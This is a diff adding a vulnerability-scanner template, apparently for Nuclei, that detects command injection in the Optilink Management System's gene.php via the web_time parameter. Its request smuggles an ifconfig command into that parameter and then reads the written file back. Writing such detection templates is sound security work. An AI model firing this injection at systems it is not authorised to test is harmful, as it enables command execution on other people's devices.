@@ -1,0 +1,40 @@
+id: optilink-ms-web-name-command-injection
+
+info:
+  name: Optilink Management System web_time Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-injection
+  description: |
+    This template detects a command injection vulnerability in the Optilink Management System via the web_time parameter.
+
+variables:
+  random: '{{rand_text_alphanumeric(5)}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: step-1
+    method: GET
+    path:
+      - '{{BaseURL}}/cgi/fsystem/gene.php?time=1&web_time=;ifconfig>%20{{random}}.txt;%20%23%20'
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(headers, 'ifconfig')
+          - contains(body, 'Fatal error')
+          - contains(body, 'undefined function')
+
+  - id: step-2
+    method: GET
+    path:
+      - '{{BaseURL}}/cgi/fsystem/{{random}}.txt'
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, 'Link encap:Ethernet')
+          - contains(body, 'HWaddr')
+          - contains(body, 'Mask:')
